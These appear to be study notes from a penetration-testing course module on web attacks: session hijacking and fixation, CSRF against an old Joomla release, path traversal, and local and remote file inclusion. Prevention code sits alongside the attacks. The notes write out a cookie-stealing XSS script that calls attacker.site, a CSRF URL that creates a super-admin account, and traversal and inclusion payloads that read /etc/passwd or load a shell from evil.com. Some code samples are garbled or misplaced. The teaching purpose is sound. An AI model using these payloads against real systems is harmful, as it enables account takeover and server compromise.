# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Web App Security
# Module 5 - Other Common Web Attacks

https://cdn.members.elearnsecurity.com/ptp_v5/section_5/module_5/html/index.html

###### Module Map
1. Introduction
2. Session Attacks
3. CSRF
4. File and Resource Attacks

____________________________________________________
## 5.1. Introduction
Other than XSS and SQL injection, there are a number of different attack techniques against a web application. Session and logic are the most targeted elements of a web application after input.

A combination of input validation attack and flawed logic and session handling brings us more ways to break the security of a web application.

____________________________________________________
## 5.2. Session Attacks
#### 5.2.1. Weakness of the Session Identifier
Most web applications offer a login page and need to keep track of the user session. The main goal is to avoid users from logging in each time they visit the web application.
Since HTTP is a stateless protocol, web application use libraries, cookies, etc. to keep track of the user session.

The **session identifier** is a unique key that identifies a user's session within a database of sessions. It is critical to the session management mechanism because, if an attacker manages to obtain it, he can impersonate (or "ride") another user's session.

  A strong session identifier is an ID that is:
  - Valid for only a single session
  - Time limited
  - Purely random (thus unpredictable)

If you rely on language libraries (e.g. JSP, PHP, etc.), session IDs are generated according to the above rules. If you want to generate IDs manually (which should only be done by advanced users), you must pay very close attention to how you do this.

It is also very important to not store session tokens in:
- `URL`: the session token will be leaked to external sites through the referrer header and in the user browser history
- `HTML`: the session token could be cached in the browser or intermediate proxies
- `HTML5 Web Storage`:
  - **Localstorage**: will last until it is explicitly deleted, so this may make session last too long
  - **Sessionstorage**: is only destroyed when the browser is closed. There may be users that do not close their browser for a long time

The following example shows a web application that uses a weak session identifier.
These session IDs are managed directly by the web application without using any server side script library and without complying with the previous rules.

#### 5.2.2. Session Hijacking
Session Hijacking refers to the *exploitation of a valid session assigned to a user*.
The attacker can get the victim's session identifier to a user using a few different methods; through typically an XSS attack is used.
  Note that if the session identifier is weakly generated (see the previous chapter), the attacker might be able to brute-force the session ID.

The attacker's goal is to find the session identifier used by the victim. Remember that in most web applications, session IDs are typically carried back and forth between client web browser and server by using:
- Cookies
- URLs

For the sake of simplicity, in the following examples we will discuss session IDs carried by cookie headers.

This is currently the most common method employed by web developers.

#### 5.2.3. Session Hijacking Attacks
A Session Hijack attack can happen by:
- Exploiting an existing XSS vulnerability (most common)
- Packet sniffing
- Gaining direct access to server filesystem where sessions are stored
- Finding session IDs in logs or browser history (sessions carried through the URL)

###### 5.2.3.1. Exploit Session Hijacking via XSS
One of the most common methods used to mount a session hijacking attack is to exploit an XSS vulnerability in the web application.

Of course, Session Hijacking is only **one** of the many possibilities of a successful XSS exploit.

You can perform this attack when all the following conditions occur;
- An XSS vulnerability exists and you can execute your own payload through it
- Session ID is sent through cookies on each HTTP request (this was an assumption)
- Cookies are readable by JavaScript

Let us briefly see how we can perform Session Hijacking by exploiting an XSS flaw. We will explain the whole process in the next video.

For now, let's suppose that we have found a XSS vulnerability on the following target web application: `elsfooradio.site`
  The application does not properly sanitize the input in the comment field. So the attacker can insert the malicious payload here (in the comment section and title) (see img-19)

  Once the payload (comment) is added, the following popup will appear. The attacker can then create a more sophisticated payload in order to steal the cookie of the user that visits the page. You can use a payload to the one used in the XSS module.

  By using the following script, we will be able to steal the users cookies. Once we collect them, we just need to change our current cookies, refresh our browser, and we will navigate the web application with the victim session.
    ```
    <script>
      var i=new Image();
      i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
    </script>
    ```

###### 5.2.3.2. Preventing Session Hijacking via XSS
Please note that the cookie content needs to be accessible by JavaScript for the above attack to be successful.

Prevention:
  In order to prevent cookie stealing through XSS, making cookies inaccessible via JavaScript is necessary. **This is as simple as creating the cookie with the "HTTPONLY" flag enabled.**

If you are using server-side script libraries to manage sessions, you cannot manage the cookies directly because the script engine offers only a simple interface.

Let's see how you could use it.

**PHP**
  Before any session-related operation is performed, you should run the following instruction:
    ```
    ini_set('session.cookie_httponly','1')
    ```

  When `session_start()` is invokes, if a valid session does not already exist, a new one will be created. A cookie with the name **PHPSESSID** and **HttpOnly** flag enabled will be sent to the web client.

**Java**
  Servlet 3.0 (Java EE 6) introduced a standard way to configure **HttpOnly** attribute for the session cookie; this can be accomplished by applying the following configuration in `web.xml`.
    ```
    ini_set('session.cookie_httponly','1');
    ```

  In Tomcat 6, the flag **useHttpOnly=True** in `context.xml` forces this behavior for applications, including Tomcat-based frameworks like **JBoss**.

  If you want to manage sessions cookies directly, you can do so from the Java cookie interface.

  *Sun JavaEE* supports the **HTTPOnly** flag in the cookie interface and for session cookies (JSESSIONID), after version 6 (Servlet class V3).
    ```
    String sessionid = request.getSessoin().getId();
    response.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid + ";HttpOnly");
    ```
    The methods **setHttpOnly** and **isHttpOnly** can be used to set and check for **HttpOnly** value in cookies. For older versions, the workaround is to rewrite the JSESSIONID value, setting it as a custom header (more info [here](https://www.owasp.org/index.php/HttpOnly)).

**.NET**
  By default, starting from **.NET 2.0**, the framework sets the **HttpOnly** attribute for both:
  - SessionIDs
  - Forms Authentication cookie

  Although session hijacking via XSS is very common, there are other methods an attacker can use such as: **packet sniffing**
  This type of attack requires the attacker to be able to sniff the HTTP traffic of the victim. This is unlikely to happen for a remote attacker but, it is feasible on a local network if both the attacker and victim are present.

    If HTTP traffic is encrypted through IPSEC or SSL, the session token will be harder (if not impossible) to obtain.

  This attack requires the following 2 conditions to be true:
  - Victim HTTP traffic can be sniffed (LAN or compromised gateway)
  - HTTP traffic must be unencrypted (No SSL)

  The goal of the attack is always the same: stealing the victim's session identifier. The attacker analyzes sniffed traffic and retrieves the victim's session identifier.

###### 5.2.3.4. Session Hijacking via Access to the Web Server
Generally speaking, session data is stored in either the web server file's system or in memory. If an attacker obtains full access to the web server, the malicious user can steal the session data of all users - not just the session identifiers.

Since having access to the server is not a vector we are interested in at this time (the attacker would have many other methods to perform more malicious activities than just stealing sessions), we will just tell you where the session data is stored on a server.

**PHP**
  Session data will be stored within the folder specified by the `php.ini` entry `session.save_path`. The attacker will focus on files named `sess_<sesionID>`.

  In a real world example, we could find the following entries:
  - *sess_ta9i1kqska407387itjf1576324*
  - *sess_7o410kk5bt14el4q1ok8r26tn12*

  If you want to hijack the user session related to the first entry, you would install a new cookie in your web browser using these values:
  - `cookie name: PHPSESSID`
  - `cookie value: ta9i1kqska407387itjf1576324`

  The attack is very simple however, it is critical that the attacker has access to the webserver file system.

**Java**
  Tomcat provides two standard implementations of a Session Manager.
  The default one stores active sessions, while the second stores active sessions have been swapped. The file name of the default session data file is `SESSIONS.ser`.

  You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html)

**.NET**
  ASP.NET can store sessions data in three different locations:
    - ASP.NET runtime process `aspnet_wp.exe`
      If the web server crashes then all sessions data will be lost
    - A dedicated Windows Service
      If the web server crashes then session data will persist but if the machine crashes then the session data will be lost.
    - Microsoft SQL Server data
      Session data will persist regardless of crashes

  Unlike PHP technology, .NET session data cannot be read directly from files on web servers.

#### 5.2.4. Session Fixation Attack
Session fixation is a session hijacking attack where, as the name suggests, the attacker fixates a **sessionID** and forces the victim to use it (after the user logs in). The attack can be divided into two phases:
1. The attacker obtains a valid **sessionID**
2. The attacker forces the victim to use this **sessionID** to establish a personal session with web server

In contrast to the previous attack, the attacker is not interested in stealing the **sessionID**; he instead creates one and forces the victim to use it. (see img-39)

###### 5.2.4.1. Step 1 : Set the sessionID
You may think that the attacker owns a valid **sessionID** only when he is already authenticated to the vulnerable site.

This is not always true; most web applications are designed to start a new session for the first time a user visits a website regardless of whether or not they are authenticated.

Although this is not a vulnerability, it could turn into **Session Fixation** if:
- the session identifier remains the same after a successfully reserved operation (for example login)
- the session identifier can be propagated (for example via URL or JavaScript)

Some web applications could permit the attacker to create and use his own personal sessionID; in this case, you do not care about obtaining a valid sessionID because you can simply create one!

If a web application releases a valid sessionID only after a reserved operation (for example, a login), **Session Fixation** is only possible if the attacker is also a member of the vulnerable website.

In this case, the attacker can use **Session Fixation** to impersonate other user.

###### 5.2.4.2. Step 2 : Force the Victim
This happens when the **sessionID** is embedded in the URL rather than the cookie header; an attacker can simply send a malicious link to the victim, which will set  the new and known **sessionID**.
A web application vulnerable to **Session Fixation** will recycle this **sessionID** and will bind the session to the victim.

###### 5.2.4.3. Vulnerable Web Application
Let's see what would happen with a vulnerable application that does not refresh the **sessionID** after the user logs in and also propagates the users sessionID via URL. In the following screenshot we can see that the sessionID is set in the parameter `SID` within the `login.php` page (see img-45)

Knowing that, the attacker creates the following link and sends it to the victim:
  ```
  http://sessionfixation.site/login/php?SID=300
  ```

Once the victim opens the link, the sessionID will be set to `300`. Since the Web Application recycles the sessionID (even after the user logs in), the attacker is able to impersonate the victim session by changing his sessionID to `300`.


#### 5.2.5. Preventing Session Fixation
Theoretically, the bests technique to defend your application from Session Fixation attacks is to generate a new **sessionID** after any authenticated operation is performed.

Most of the time however, it is sufficient to destroy and regenerate a new session upon successful login.
Server-side scripting language provide different libraries and built-in functions to manage sessions.

Let's take a look at them.

**PHP**
  The following method will replace the current **sessionID** with a new one and will retain the current session information.
  The old session cookie will be automatically invalidated and a new one will be sent
      ```
      session_regenerate_id(true);
      ```
  You can find more information [here](http://php.net/manual/en/function.session-regenerate-id.php)

**Java**
  In Java, methods for performing the invalidation of the current session and the creation of a new one does not exist, therefore, you should use the following instruction set:
    ```
    oldHTTPSession=HttpServletRequest.getSession();
    oldHTTPSession.invalidate();
    newHttpSession=HttpServletRequest.getSession(true);
    ```

  The old session cookie will be automatically invalidated and a new one will be sent.
  You can find more information [here](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html)

**.NET**
  Preventing Session Fixation in .NET is more complicated because of the tricky API. The .NET framework provides the `HttpSessionState.Abandon()` method to manage session removal.

  In this method, .NET documentation states that: *once the Abandon method is called, the current session is no longer valid and a new session can be started*

  Although the session is invalidated, the web application will continue using the same **sessionID** within the cookie header, so Session Fixation could still occur. To solve this issue, Microsoft suggests you to explicitly invalidate the cookie session:
    *When you abandon a session, the sessionID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same sessionID but will have a new session state stance*

  So the correct code would be:
    ```
    Session.Abandon();
    Response.Cookie.Add(new HttpCookie("ASP.NET_SessionID", ""));
    ```

  You can find more information [here][https://msdn.microsoft.com/en-us/library/ms524310(v=vs.90).aspx].


(see vid-54)
____________________________________________________
## 5.3. CSRF
**CSRF** or **XSRF** attacks (also pronounced Sea-Surf attacks) are something that every web app tester should know about and master. This is because automated scanning tools cannot easily find these vulnerabilities.
CSRF exploits a feature of internet browsing, instead of a specific vulnerability.

CSRF is a vulnerability where a third-party web application is able to perform an action on the user's behalf.
It is behalf on the fact that web applications can send requests to other web applications, without showing the response.
Let us have a look at a typical example.

Example (see img-59):
  1. Bob (victim) visits `amazon.com`, logs in, then leaves the site without logging out
  2. Bob then visits `foo.com` (malicious website) which inadvertently executes a request to `amazon.com` (`<img src="http://www.amazon.com/buy/123">`) from the Bob's browser (such as buy a book)
  3. The victim browser send this request, along with all the victim cookies. The request seems legit to `amazon.com`

Since Bob is still logged in on Amazon, the request goes through and the money is withdrawn from his account for the purchase of the book.

How can `foo.com` issue a request to Amazon on behalf of Bob?

  Whatever is in a webpage, Bob's browser parses it and requests it: if an image with the URL `amazon.com/buy/123` is present in the page, the web browser will silently issue a request to `amazon.com`, thus buying the book.

  This is because Bob already has an authenticated session open on Amazon.

It sounds simple, because it really is.
Google, Amazon, eBay, and other major websites used to be vulnerable to CSRF but a large number of smaller websites and third party application scripts still remain vulnerable.

#### 5.3.1. Finding CSRF
All request to a web application that do not implement an anti-CSRF mechanism are automatically vulnerable.
This may sound trivial but CSRF is really that common:
- http://thehackernews.com/2014/08/flickr-cross-site-request-forgery.html
- http://web.archive.org/web/20150418174949/http:/breakingbits.net/2015/01/18/taking-over-godaddy-accounts-using-csrf/
- http://www.ehackingnews.com/2012/10/hacker-news-csrf-vulnerability-in-Twitter.html

When a web application stores session information in cookies, these cookies are sent with every request to that web application (same-origin policy applies).

This may sound odd but, storing session tokens in cookies enables CSRF exploitability (while, of course storing session tokens into URLs enable other kind of exploits)

Token and Captchas are the most commonly used protection mechanisms.
We will study them in more detail one the CSRF exploitation process is clear.

#### 5.3.2. Exploiting CSRF
Lets take a look at a real world example. It is old but it will help us to understand how CSRF works:
  *In 2005, we considered using Joomba as a CMS for Hacker's Center, and retiring our old, hand-coded ASP-based CMS*

The first thing we realized when we took it for a drive was the presence of multiple CSRF vulnerabilities.

The worst of them allowed us to have super administrator access. When the admin had an open session on his Joomla backend, we were able to upload arbitrary files, post articles or even deface his own website.

If only we could manage to force him into visiting a web page containing the exploit payload.

What we will see now is how we built a payload to have the Super Admin create another super admin in order to grant us persistent backdoor access to the website.
  The main difference between this and other vulnerabilities is that this exploit does not require "malicious" payload data.

  In the next slide, we will go through the process of building a working exploit for the Joomla vulnerability (affected version is 1.0.13)

  This process will go through the steps required to build a working exploit against Joomla 1.0.13 and below 1.5rc3.

  If you want to test this by yourself, you can download a copy of a vulnerable Joomla release from the [Joomla SVN](http://joomlacode.org/gf/project/joomla/scmsvn/?action=browse&path=/development/releases/1.0/) or [here](http://joomlacode.org/gf/project/joomla/frs/?action=FrsReleaseBrowse&frs_package_id=1)

Steps:
  First, we have to identify the structure of the request that will let us reach our objective (adding a super admin in our case).
    There is obviously a CGI that takes some arguments through GET or POST.

    The CGI creating a new Super Admin user in Joomla is `/administrator/index.php`. It takes arguments through the POST method.

    Go to that form and use Burp to figure out all the parameters that the form send when adding a new test Super Administrator. (see img-72)

    Since the request method is a POST, we have to use a proxy that will let us transform a GET request into a POST request.

    To achieve this we can use Chris Shifflet's PHP [proxy](http://shiflett.org/blog/2007/jul/csrf-redirector). This is a simple, but effective source code used by Chris to achieve the transformation GET -> POST:
      ```
      <iframe style="width" 0px; height: 0px, visibility: hidden" name "hidden"></iframe>
      </form>
      <script>document.csrf.submit();</script>
      ```

      The script takes a URL as input with additional parameters.
      These parameters will be sent to it as a GET.
  The script will make sure to build a POST request to the CGI attaching these parameters.
    ```
    http://sifflet.org/csrf.php?csrf=[CGI]?[ARGUMENTS]
    ```

  Our CGI is nothing but:
    ```
    http:%3a%2Fvuln%2Fadministrator%2Findex%2Ephp
    ```
  The arguments found in the previous step are the parameters in querystring format:
    ```
    name=John&username=john&email=john%40does.com&passowrd=john&password2=john&gid=25&block=0&sendEmail=0&id=0&cid%5B%5D=0&option=com_users&task=apply&contact_id=
    ```

  So our final exploit URL is:
    ```
    http://sifflet.org/csrf.php?csrf=name=John&username=john&email=john%40does.com&passowrd=john&password2=john&gid=25&block=0&sendEmail=0&id=0&cid%5B%5D=0&option=com_users&task=apply&contact_id=
    ```

  (see vid-76)

#### 5.3.3. Preventing CSRF
This is a penetration tester course but, studying countermeasures and protection mechanisms often makes the exploitation explanation much cleaner.

Also, do not forget that you were hired to provide solutions.

The most common protection mechanism against CSRF exploit is the **token**.
The token is a nonce (a number used to perform a given action unpredictable for an attacker) and makes part of the request required to perform a given action unpredictable for an attacker.

In a real world scenario, the **Add-user** form in the administration area of CMS's include a hidden input that requires a token. This token can be implemented as an MD5 hash (or stronger) of some randomly-generated string.

While rendering the form to the user, the following steps are taken by the web application to enforce protection against CSRF exploits:
  1. Generate a token
  2. Include the token as hidden input on the form
  3. Save the token in the session variables

The form will be submitted with the token:
  ```
  <form action="adduser.php" method="POST">
  <input type="text" name="username"/>
  ...
  <input type="hidden" name="token" value="eb4f130331f9b0a25360975d7d565a76"/>
  ...
  </form>
  ```
  `adduser.php` will have to check that the token stored in the session matches the token received through the POST. If they match, the request is fulfilled, otherwise it is refused.

###### 5.3.3.1. Why this works?
An attacker able to force the victim to request the forged URL, has to provide a valid token.

Two conditions may occur:
- The victim has not visited the page and, as such, has no token set in session variables at all
- The victim has visited the page and has a token

In the second case, the attacker has to guess the correct token. That is generally considered impossible as long as token generation is truly random and the token is not easily predictable.
It is crucial that the token must be random, unpredictable, and change for at least every session.

**Note:**
*The token becomes useless when the application is also vulnerable to XSS*

Because of the same-origin policy, you cannot read the token set to `domain-vuln.com` from `domain-evil.com`.

However, using a exploit on `domain-vulv.com`, the JavaScript meant to steal the token (and use it in a new request) will be executed on the legit domain (`domain-vuln.com`)

The bottom line is this:
  *To prevent CSRF, one has to implement a random token for every request and be immune to XSS exploits at the same time.*

____________________________________________________
## 4.4. File and Resource Attacks
As you have already studied in the *Authentication and Authorization* module, **Authorization** is what you are able to do: authorization attacks have to do with accessing information that the user does not have permission to access.

Although we explained some authorization bypass attacks in the previous module, here we are going to focus and dig deeper on attacks related to file and resources.

#### 5.4.1. Path Traversal
Some web application need to access resources on the file system to implement the web application (such as images, static text, and so on). They sometimes use parameters to define the resources.
When these parameters are user-controlled, not properly sanitized, and are used to build resource path on the file system, security issues may arise.

For example, let us consider a Web Application that allows a visitor to download a file by request the following URL : `http://www.elsfoo.com/getFile?path=FileA418fS5fds.pdf`

The parameter **path** will be used by the web application to locate the resource named `FileA418fS5fds.pdf` on the file system.

If the web application does not sanitize the parameter properly an attacker could manipulate it to access the contents of any arbitrary file (access resources that are note intended to be accessed).

This attack, also known as the **dot-dot-slash** (**../**), is usually performed by means of those characters that allow us to move up in the directory tree.

By prefacing the sequence **../** it may be possible to access directories that are hierarchically higher than the one from which we are picking the file.

  For example, the following URL may be used to access the password file in UNIX systems:
    ```
    http://www.elsfoo.com/getFile?path=../../../etc/passwd
    ```

  Using relative path addressing, we are going up 3 levels from the current one to reach the root. The same may be achieved using **absolute path**:
    ```
    http://www.elsfoo.com/getFile?path=/etc/passwd
    ```

  On Windows systems, depending on the target OS version, you can try the following resources:
    ```
    http://www.elsfoo.com/getFile?path=../../../windows/win.ini
    ```
    ```
    http://www.elsfoo.com/getFile?path=../../../boot.ini
    ```

Let's first analyze some useful information about how to build a path traversal payload and then see how we can protect our web applications against these attacks.
- Path convention
- Best defensive

###### 5.4.1.1. Path Convention
Depending on the OS running on the web server, a root folder can be located using the following syntax:
- \*NIX: Slash (`/`)
- Windows: <Drive Letter>: `\` (`C:\`)

The following are the directory separator symbols to use depending on the OS:
- \*NIX: Slash (`/`)
- Windows: <Drive Letter>: Slash (`/`), Backslash (`\`)

To move up the current directory you can use the following sequence: `../`
A specific sequence can be used to terminate the current file name.
This sequence takes the name of **NULL BYTE**: `%00`

Note that `%00` does not work with PHP versions >= [5.3.4](http://svn.php.net/viewvc?view=revision&revision=305507).

This can be useful to terminate the string in case something else is appended to it by the web application. An example in pseudo code:
  ```
  file_read("/htdocs/website/reports/" user_input + ".pdf");
  ```
  The `%00` would allow the user to terminate the string and read any other file extensions: `../../etc/passwd%00`.

###### 5.4.1.2. Encoding
Web applications that perform filtering operations on these nasty characters should be aware of different encodings. Let's see a few examples of URL encoding and double URL encoding:
  |Character|URL encoding|16-bit Unicode|
  |---------|------------|--------------|
  | `.`     | %2e        | %u002e       |
  | `/`     | %2f        | %u2215       |
  | `\`     | %5c        | %u2216       |

Any combination of the previous encoding may work on the target web application. So you may try something like the following payloads:
  | `../`       | `..\`             |
  |-------------|-------------------|
  | `%2e%2e%2f` | `%2e%2e%5c`       |
  | `%2e%2e/`   | `%2e%2e\`         |
  | `..%2f`     | `..%5c`           |
  | `..%255c`   | `%252e%252e%252c` |

###### 5.4.1.3. Best Defensive Technique
The simplest way to defend against a Path traversal attack is to filter any malicious sequences from the input parameters; below, you can see some typical sequences that should be filtered. In most cases, you will also want to filter the `/` char alone.
- `../`
- `..\`
- `%00 (NULL BYTES)`

#### 5.4.2. File Inclusion Vulnerabilities
File inclusion vulnerabilities are divided into **Remote** and **Local**, depending on where the file to include is located.

###### 5.4.2.1. Local File Inclusion
Some of you may remember the *vintage* LFI (Local File Inclusion) attack against the first Perl CGIs in the early 90's:
  ```
  visit.pl?url=../../../../etc/passwd
  ```

This type of vulnerability was very common at the time, as a result of security awareness not being very widespread among developers.
However, it is still found in custom scripts where path characters are not stripped from input and the input is used as part of an **include**.

The vulnerability is easier to understand if we look at a simple section of PHP code. Let us suppose that the target application changes its content depending on the location of the visitor. The URL will be something like this:
  ```
  http://target.site/index.php?location=IT
  ```
and that the PHP code handles the parameter as follows:
  ```
  <?php
    include("loc/" . $GET['location']);
  ?>
  ```

As you can see we can just enter any valid local path-to-file to have the PHP include it in the response to our browser:
  ```
  index.php?location=../../../etc/passwd
  ```

This will go up 3 directories and then return `etc/passwd` which is the famous Unix password file.

Let's see an example.
  The target application hosted on `http://lfi.site` uses the `location` parameter to render the content to the user. (see img-105)
    ```
    http://lfi.site/index.php?location=US
    ```
    ```
    http://lfi.site/index.php?location=IT
    ```

  In order to test if the application is vulnerable to LFI, we can use the following payload:
    ```
    http://lfi.site/index.php?location=../../../../../../etc/passwd
    ```

  if instead, the code looks like this:
    ```
    <?php
      include($_GET['location'] . "/template.tlp")
    ?>
    ```

  A valid exploit would be:
    ```
    index.php?location=../../../etc/passwd%00
    ```
  `%00` is the null character that terminates the string.

  These vulnerabilities are usually found in little custom made CMS's where pages are loaded with an include and their paths taken from the input.

###### 5.4.2.2. Remote File Inclusion
**Remote File Inclusion** (RFI) works the same way as LFI; the only differences is that the file to be included is pulled remotely.

Our aim in this case is not just to read but, to include our own code in the execution. An exploitable URL would look like this:
  ```
  vuln.php?page=http://evil.com/shell.txt
  ```
  In this case, `shell.txt` (containing PHP code), will be included in the page and executed.

A common exploit to this vulnerability is to include a PHP shell that would let the hacker or the pentester execute any code on the server.
Even the simplest PHP shell will accept commands from GET/POST arguments and execute them on the server.
